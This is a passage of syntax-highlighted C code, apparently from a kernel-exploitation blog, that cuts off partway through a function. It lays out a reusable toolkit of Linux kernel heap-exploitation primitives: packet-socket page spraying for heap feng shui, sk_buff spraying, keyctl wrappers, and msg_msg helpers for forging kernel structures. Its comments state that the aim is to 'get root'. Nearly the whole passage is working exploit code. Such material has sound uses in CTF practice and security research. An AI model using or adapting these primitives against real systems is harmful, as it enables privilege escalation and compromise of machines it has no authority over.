class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * II - fundamental  kernel structures</span></span><br><span class="line"><span class="comment"> * e.g. list_head</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * III -  pgv pages sprayer related </span></span><br><span class="line"><span class="comment"> * not that we should create two process:</span></span><br><span class="line"><span class="comment"> * - the parent is the one to send cmd and get root</span></span><br><span class="line"><span class="comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span></span><br><span class="line"><span class="comment"> *      receiving cmd from parent and operates it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="keyword">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc pages, return the socket fd */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket_and_alloc_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd, version;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, </span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">packet_socket_setup</span><span class="params">(<span class="keyword">uint32_t</span> block_size, <span class="keyword">uint32_t</span> frame_size,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">uint32_t</span> block_nr, <span class="keyword">uint32_t</span> sizeof_priv, <span class="keyword">int</span> timeout)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">	<span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket (AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> v = TPACKET_V3;</span><br><span class="line">	<span class="keyword">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt (PACKET_VERSION)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req3</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;req3, <span class="number">0</span>, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	req3.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">	req3.tp_block_nr = block_nr;</span><br><span class="line">	req3.tp_block_size = block_size;</span><br><span class="line">	req3.tp_frame_size = frame_size;</span><br><span class="line">	req3.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">	req3.tp_retire_blk_tov = timeout;</span><br><span class="line">	req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt (PACKET_RX_RING)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	sa.sll_family = PF_PACKET;</span><br><span class="line">	sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">	sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">	sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_halen = <span class="number">0</span>;</span><br><span class="line">	sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rv = bind(s, (struct sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] bind (AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_page</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(struct pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_cmd_handler</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line"><span class="keyword">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_pgv_system</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_pgv_pages</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to </span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IV - keyctl related</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The MUSL also doesn&#x27;t contain `keyctl.h` :( </span></span><br><span class="line"><span class="comment"> * Luckily we just need a bit of micros in exploitation, </span></span><br><span class="line"><span class="comment"> * so just define them directly is okay :)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_SPEC_PROCESS_KEYRING	-2	<span class="comment">/* - key ID for process-specific keyring */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_UPDATE			2	<span class="comment">/* update a key */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_REVOKE			3	<span class="comment">/* revoke a key */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_UNLINK			9	<span class="comment">/* unlink a key from a keyring */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_READ			11	<span class="comment">/* read a key or keyring&#x27;s contents */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_alloc</span><span class="params">(<span class="keyword">char</span> *description, <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, plen, </span><br><span class="line">                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_update</span><span class="params">(<span class="keyword">int</span> keyid, <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_read</span><span class="params">(<span class="keyword">int</span> keyid, <span class="keyword">void</span> *buffer, <span class="keyword">size_t</span> buflen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_revoke</span><span class="params">(<span class="keyword">int</span> keyid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_unlink</span><span class="params">(<span class="keyword">int</span> keyid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * V - sk_buff spraying related</span></span><br><span class="line"><span class="comment"> * note that the sk_buff&#x27;s tail is with a 320-bytes skb_shared_info</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * socket&#x27;s definition should be like:</span></span><br><span class="line"><span class="comment"> * int sk_sockets[SOCKET_NUM][2];</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_socket_array</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* socket pairs to spray sk_buff */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_socket[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create no.%d socket pair!\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_sk_buff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_sk_buff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;[x] failed to received sk_buff!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VI - msg_msg related</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MSG_COPY</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct msgbuf &#123;</span></span><br><span class="line"><span class="comment">    long mtype;</span></span><br><span class="line"><span class="comment">    char mtext[0];</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_msg_queue</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((struct msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">peek_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, </span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_msg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next, <span class="keyword">uint64_t</span> m_list_prev, </span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="keyword">uint64_t</span> m_type, <span class="keyword">uint64_t</span> m_ts,  <span class="keyword">uint64_t</span> next, <span class="keyword">uint64_t</span> security)</span></span></span><br><span class="line"><span 